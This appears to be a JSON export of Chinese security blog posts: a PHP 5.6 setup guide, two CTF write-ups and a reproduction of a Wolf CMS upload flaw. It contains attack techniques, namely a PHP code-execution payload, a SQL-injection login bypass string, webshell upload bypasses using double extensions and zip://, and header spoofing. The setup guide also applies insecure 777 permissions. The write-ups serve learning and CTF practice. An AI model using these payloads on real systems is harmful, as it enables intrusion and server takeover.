php命令默认安装的是php7.0，版本太高，对我们网站的源码支持不太好，因为高版本可能弃用某些低版本的函数或者某些函数使用方法发生变化。解决方法：添加带有php5.5的源：1234567apt-get install -y language-pack-en-baseLC_ALL=en_US.UTF-8 add-apt-repository ppa:ondrej/phpadd-apt-repository ppa:ondrej/phpapt-get updateapt-cache search php5apt-get install php5.6-common -yapt-get install libapache2-mod-php5.6 -y 接下来我们需要安装php5.6以及一些php的扩展插件：1apt-get install php5.6 php5.6-cgi php5.6-cli php5.6-phpdbg php5.6-fpm php5.6-dev php5.6-common php5.6-curl php5.6-gd php5.6-imap php5.6-intl php5.6-ldap php5.6-mysql php5.6-pspell php5.6-recode php5.6-snmp php5.6-sqlite3 php5.6-sybase php5.6-tidy php5.6-opcache php5.6-json php5.6-bz2 php5.6-mcrypt php5.6-odbc php5.6-readline php5.6-interbase php5.6-xmlrpc php5.6-enchant php5.6-gmp php5.6-xsl php5.6-bcmath php5.6-mbstring php5.6-soap php5.6-xml php5.6-dba 安装好后，我们将php_cms源码放到/var/www/html目录下：给予html文件夹和php_cms的attachment文件夹777权限：重启apache服务：浏览器访问我们的网站，发现显示拒绝连接数据库：这是因为我们之前设置了MySQL密码，所以我们需要修改php_cms的配置文件，配置文件在/var/www/html/include/database.inc.php：我们还需在新装的MySQL中创建一个数据库名为cms(上图连接数据库配置文件中数据库名为cms)，并将install.sql数据导入cms库中：此时再次打开浏览器，可以看到网站成功搭建起来：","categories":[{"name":"Linux","slug":"Linux","permalink":"https://mochazz.github.io/categories/Linux/"}],"tags":[{"name":"环境搭建","slug":"环境搭建","permalink":"https://mochazz.github.io/tags/环境搭建/"}]},{"title":"2017全国信息安全竞赛 WriteUp","slug":"2017ncstisc","date":"2017-07-10T14:00:00.000Z","updated":"2017-09-07T01:07:26.501Z","comments":true,"path":"2017/07/10/2017ncstisc/","link":"","permalink":"https://mochazz.github.io/2017/07/10/2017ncstisc/","excerpt":"","text":"Misc题目签到题(√)做个问卷，全答对就给flag了。 传感器1(√)比赛时纯手动替换：这是赛后自己写的脚本：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#coding:utf-8__author__ = &apos;Mochazz&apos;encode = &apos;差分曼彻斯特编码&apos;dic = &#123; &apos;0&apos;:&apos;0000&apos;, &apos;1&apos;:&apos;0001&apos;, &apos;2&apos;:&apos;0010&apos;, &apos;3&apos;:&apos;0011&apos;, &apos;4&apos;:&apos;0100&apos;, &apos;5&apos;:&apos;0101&apos;, &apos;6&apos;:&apos;0110&apos;, &apos;7&apos;:&apos;0111&apos;, &apos;8&apos;:&apos;1000&apos;, &apos;9&apos;:&apos;1001&apos;, &apos;A&apos;:&apos;1010&apos;, &apos;B&apos;:&apos;1011&apos;, &apos;C&apos;:&apos;1100&apos;, &apos;D&apos;:&apos;1101&apos;, &apos;E&apos;:&apos;1110&apos;, &apos;F&apos;:&apos;1111&apos;, &#125;string1 = &apos;3EAAAAA56A69AA55A95995A569AA95565556&apos;;//题目# string1 = &apos;3EAAAAA56A69AA556A965A5999596AA95656&apos;//所求list1 = []for i in string1: list1.append(dic[i])list1 = (&apos;&apos;).join(list1)print(&apos;%s每位数字转成二进制:&apos;%string1)print(list1)l = []flag = list1[:2]if flag == &apos;00&apos; or flag == &apos;11&apos;: l.append(&apos;0&apos;)else: l.append(&apos;1&apos;)i = 2while i &lt; len(list1): if list1[i-2:i] == list1[i:i+2]: l.append(&apos;0&apos;) else: l.append(&apos;1&apos;) i += 2l = (&apos;&apos;).join(l)print(&apos;转换结果：&apos;)print(l)dic2 = &#123;value:key for key,value in dic.items()&#125;i = 0flag = []while i &lt; len(l): flag.append(dic2[l[i:i+4]]) i += 4flag = (&apos;&apos;.join(flag))print(&apos;turn to hex&apos;)print(&apos;0x&apos;+flag)print(&apos;The ID is:&apos;)print(&apos;0x&apos;+flag[6:14]) 其实这个脚本写得不好，因为太啰嗦了。16进制转2进制完全可以用python的binascii模块完成。之所以用字典来转换，是因为我还不熟悉binascii模块的用法，待改进。 warmup按照提示下载下来即可： BadHacker下下来是一个数据流量包 传感器2 embarrass(√)下载下来是一个数据包使用wireshark打开，追踪里面的FTP数据，发现数据量很大，使用NetworkMiner.exe打开这个数据包，将其中的数据分离出来(NetworkMiner.exe无法打开pcapng格式文件，需要将pcapng文件另存为pcap格式文件即可打开)：分析分离出的misc2.pcapng文件，使用ctrl+F搜索flag：选择追踪TCP流，再次搜索flag即可搜到： pyHAHA下载下来是一个.pyc结尾的文件，打开发现字符串是倒的：编写python脚本将整个文件倒过来存储，脚本如下：1234f = open(&apos;Py.py&apos;,&apos;wb&apos;)with open(&apos;PyHaHa.pyc&apos;,&apos;rb&apos;) as g: f.write(g.read()[::-1])f.close() 发现结尾给了两个flag，还隐藏了一个压缩文件：解压出来是一个mp3文件：猜测是用MP3Stego加了密，所以我们就需要找出加密用的key。然后就是找不到key，官方也不给hint。。。 调查问卷(√)签退题，随便填就给flag WebPHP execise(√)这题考察远程代码执行，payload如下：eval(‘show_source(“index.php”);’);这条语句执行后会显示出index.php的源码。PS：直接使用show_source(“index.php”);也行源码如下：12345678&lt;?php if(isset($_REQUEST[&apos;code&apos;]))&#123; $code = &quot;&lt;?php &quot;. $_REQUEST[&apos;code&apos;] . &quot;?&gt;&quot;; file_put_contents(&quot;tmp.php&quot;,$code); echo &quot;OUTCOME: \\n&quot;; include &quot;tmp.php&quot;; &#125;?&gt; file_put_contents()函数：用法：file_put_contents(文件名，字符串)功能：会将整个文件原有的内容删掉，然将第二个参数的值作为内容写入文件中。现在我们要做的就是找到flag所在位置，然后使用show_source()函数将flag内容显示出来即可。输出当前网页所在路径：列出该路径下所有文件：显示flag文件内容提交即可： wanna to see your hat?(√)考察svn源码泄露、代码审计、sql注入waf函数过滤post方式接收的name参数:12345678function waf($value)&#123; $Filt = &quot;\\bUNION.+SELECT\\b|SELECT.+?FROM&quot;; if (preg_match(&quot;/&quot;.$Filt.&quot;/is&quot;,$value)==1)&#123; die(&quot;found a hacker&quot;); &#125; $value = str_replace(&quot; &quot;,&quot;&quot;,$value); return $value;&#125; 使用Payload:or/**/1=1#’登录，直接取得flag，源码还需研究研究。 flag vending machine一个可以买flag的魔法商城，然后你的现金低于flag的标价。可能考查的是条件竞争。 Guestbook 方舟计划 CryptoClassical Partial Mailbox Reverse填数游戏(√)逆向大佬做的，将绿色部分替换成0，提交这组数字即是flag apk crack 欢迎来到加基森 溯源 ReverseBabyDriver NotFormat easyheap","categories":[{"name":"CTF竞赛训练","slug":"CTF竞赛训练","permalink":"https://mochazz.github.io/categories/CTF竞赛训练/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://mochazz.github.io/tags/CTF/"}]},{"title":"wolf cms上传漏洞分析","slug":"wolf_cms","date":"2017-07-06T14:00:00.000Z","updated":"2017-09-07T01:05:13.941Z","comments":true,"path":"2017/07/06/wolf_cms/","link":"","permalink":"https://mochazz.github.io/2017/07/06/wolf_cms/","excerpt":"","text":"最近看Freebuf上的wolf CMS任意上传漏洞分析，今天有空就复现下，在此做个记录总结 环境准备打开MySQL，创建一个数据库，库名叫wolf：将下载好的wolf cms放在wamp的www目录下:打开浏览器访问127.0.0.1，配置如下，点击continue to install：Wamp中MySQL的默认账号：root，密码为空。直接点击install now：记住下面的登录账号密码，待会要用到。这个密码是随机产生的：成功登录后台： 漏洞分析这些准备操作就绪后，我们来分析一下存在安全问题的php函数。该函数位于C:\\wamp\\www\\wolf\\plugins\\file_manager\\FileManagerController.php。我们找到问题函数upload()： $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION)); $ext_arr = array(&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;inc&apos;); if (in_array($ext, $ext_arr)) { Flash::set(&apos;error&apos;, __(&apos;Not allowed to upload files with extension :ext&apos;, $ext)); redirect(get_url(&apos;plugin/file_manager/browse/&apos;)); } 用\\$ext存储上传文件的后缀名，如果后缀名在\\$ext_arr数组组中，则输出错误警告，并将url重定向到plugin/file_manager/browse/。这就是典型地采用了黑名单机制，这也是问题所在。只要我们绕过了检查，即后缀名不在该数组中即可。更具体的代码分析点这里 漏洞利用过程我们上传一个cmd.php.ppp这个ppp可以是任意的后缀，只要服务器无法识别就行。由于服务器无法识别ppp这个后缀名，他就会从左往右按顺序识别，即找到php，发现可以识别，于是就将cmd.php.ppp按照php文件来解析，这就导致我们的webshell可以在服务器端成功执行。使用菜刀连接http://localhost/public/cmd.php.ppp下面是我们成功拿到服务器的截图：除了可以绕过黑名单，我们还可以直接利用编辑文件的功能，将我们的webshell直接写入服务器，过程如下：写入一句话，并保存：使用菜刀连接：使用“.phtml”(或者“php.”)为后缀命名文件，也可以绕过。 漏洞总结在编写服务器端代码时，切不可相信来自用户的任何输入、文件，都要对其进行严格检查。采用黑名单机制只可暂时防止部分恶意输入，总是有能被绕过，应该采取白名单代替。该版本cms允许用户通过后台直接创建、编辑文件，但是未对用户输入的内容进行安全验证，这也导致了攻击者可以上传webshell。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://mochazz.github.io/categories/Web安全/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://mochazz.github.io/tags/文件上传/"}]},{"title":"HappyCTF WriteUp","slug":"happyctf","date":"2017-07-04T14:00:00.000Z","updated":"2017-09-07T01:03:05.670Z","comments":true,"path":"2017/07/04/happyctf/","link":"","permalink":"https://mochazz.github.io/2017/07/04/happyctf/","excerpt":"","text":"刚刚搭建好的博客，第一篇就拿来写WP吧。正好熟悉一下MarkDown的语法。闲话不多说，进入正题。 Web题目成绩虽然不是很好，还是放张图纪念一下。 签到题给了一个网址，发现访问不了，扫描端口，发现8888端口开放，使用：curl -I 9.9.9.9:8888windows使用VPN连接后使用nmap遇到的问题： 你不是蜘蛛打开题目链接，显示“你不是蜘蛛”，访问robots.txt，在访问其中的文件路径即可得到flag 管理员的愤怒打开题目链接，显示成功连接数据库，查看robo.txt再访问dbadmin获取phpmyadmin账号密码将获取的账号密码登录phpmyadmin即可获得flag 无权查看打开题目链接，显示forbidden！查看源代码发现index.php.bak访问获得源代码构造user和password参数 情报在哪里题目是一个阿童木爱好者站使用awvs扫描得到download.php题目又提示目标文件名为passwd，所以构造参数将文件下载下来使用strings passwd查看，并将最后那串base64解码即得flag upload题目就是让我们上传一个一句话木马上去，当然只允许图片格式文件上传设置代理，将我们的木马命名成1.gif上传，用Burpsuite抓包，将文件后缀改成1.php即可得到flag mail一开始是这么想的：只要字符串captcha的md5值前4位等于da8e，domain填上邮箱即可获得flag。但是刷新后，等号后面就不是da8e了，而且每刷新一次，就更换一次。没思路，等看完大佬们的WP再更新 未上线的聊天室没思路。。。 刮刮乐题目：在flag区右键审查元素，然后一直刷新界面，发现canvas偶尔会变一次，在变的那次刮开即可得到flag 魔法商城这题考察逻辑漏洞 包罗万象可以上传文件，还限制了文件类型，可以上传zip所以我们将一句话木马压缩成zip上传得到返回路径把url改成9.9.9.22/index.php?url=zip://文件地址，使用菜刀连接即可得到flag Register123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpsession_start();require('config.php');foreach($_POST as $key =&gt; $value)&#123; $$key = (trim((string)$value) != '')?trim((string)$value):null;&#125;$conn = mysql_connect($server,$dbusr,$dbpwd);if($conn === false)&#123; die('Connect Failed.');&#125;mysql_select_db($dbname);if(isset($_SESSION['uid']))&#123; $token = getToken($_SESSION['uid']); echo \"Your token is &#123;$token&#125;&lt;br&gt;\\n\"; &#125;elseif(isset($customid) &amp;&amp; isset($password))&#123; if(strlen($customid) &lt; 6 || strlen($password) &lt; 6 || strlen($customid) &gt; 11 || strlen($password) &gt; 30)&#123; die('1:Error.'); &#125; if(!is_numeric($customid))&#123; die('2:Error.'); &#125; register($customid, $password); $_SESSION['uid'] = getuid($customid); header('location: ./index.php?'.time());&#125;else&#123; echo &lt;&lt;&lt;EOD&lt;form action=\"index.php\" method=\"post\"&gt; CustomID: &lt;input type=\"text\" name=\"customid\" maxlength=\"11\"&gt;&lt;br&gt; Password: &lt;input type=\"password\" name=\"password\" maxlength=\"30\"&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"register\"&gt;&lt;br&gt;&lt;/form&gt;EOD;&#125;mysql_close($conn);function register($customid, $password)&#123; $password = md5($password); $token = md5(mt_rand()); mysql_query(\"insert into z_users(`customid`, `password`) values('&#123;$customid&#125;','&#123;$password&#125;')\"); $result = mysql_query(\"SELECT LAST_INSERT_ID()\"); $rows=mysql_fetch_row($result); $uid = $rows[0]; mysql_query(\"insert into z_extra(`uid`, `data`) values('&#123;$uid&#125;','&#123;$token&#125;')\");&#125;function getuid($customid)&#123; $result = mysql_query(\"select * from z_users where customid = '&#123;$customid&#125;' order by id desc\"); if($result)&#123; $row = mysql_fetch_array($result); return $row['id']; &#125; return 0;&#125;function getToken($id)&#123; $result = mysql_query(\"SELECT data from z_extra where uid = &#123;$id&#125;\"); $rows = mysql_fetch_row($result); return $rows[0];&#125;echo \"&lt;h4&gt;Source: &lt;/h4&gt;\";show_source(__FILE__);?&gt; Web312345678910111213&lt;?phpini_set('session.serialize_handler', 'php');require(\"./class.php\");session_start();$obj = new foo1();$obj-&gt;varr = \"phpinfo.php\";?&gt; 这是foo1的析构函数 我的博客title简直误导我。。。该网站存在文件包含漏洞查看源码获得flag： 新闻网站没做出来 绕过看门狗题目和上一题一样，多了安全狗。通过大小写绕过关键字即可得到flag，由于比赛时手工注入，未截图 Be allowed?用Burpsuite抓包，添加X-Forwarded-For: localhost然后就不会了。。。 admin123456过滤任何字符，小写字母自动转换成大写字母网页源代码如下 第三个空白页查看源代码：访问http://9.9.9.32/?way=AHAHAH，出现如下页面：使用Burpsuite抓包，添加X-Forwarded-For: 127.0.0.1即可获得flag 运维失误 古老的留言板 2048 jshunt这题很懵逼，无缘无故拿了一血，之后整场比赛没人做出来(有bug) iphone6使用chrome，按F12选择iPhone6刷新页面，查看即可 又是空白页 misc、crypto题目这是什么下载下来是一个apk，本来以为是安卓逆向的，结果并不是明显jsfuck，复制到控制台运行即可： 粽子的来历题目给了四个损坏的压缩文件用winhex打开发现有奇怪之处将其全改成FF，可得到一首诗，他们的行间距不一样将行距大的设为1，小的设为0，即可得到100100100010，其md5即是flag 大白图片感觉像是被截取了一半，查看属性：高度256对应16进制为100，使用winhex打开图片，找到100改成200即可看到flag： rar使用Advanced RAR Password Recovery破解即可： ningen使Ziperello破解即可： 萌萌哒的八戒猪圈密码： 文件中的秘密这题源图片不见了，截别人的wp来用： 隐藏的钥匙题目是一张图片，使用记事本打开搜索flag，然后base64解密即可得到flag 题目忘了下载下来是一个不正常的图片，使用strings 这是什么.jpg查看将最后两行的HTML编码保存在文本编辑器中，并保存为flag.html，打开即可：=========================== 未完，待更新 ===============================","categories":[{"name":"CTF竞赛训练","slug":"CTF竞赛训练","permalink":"https://mochazz.github.io/categories/CTF竞赛训练/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://mochazz.github.io/tags/CTF/"}]}]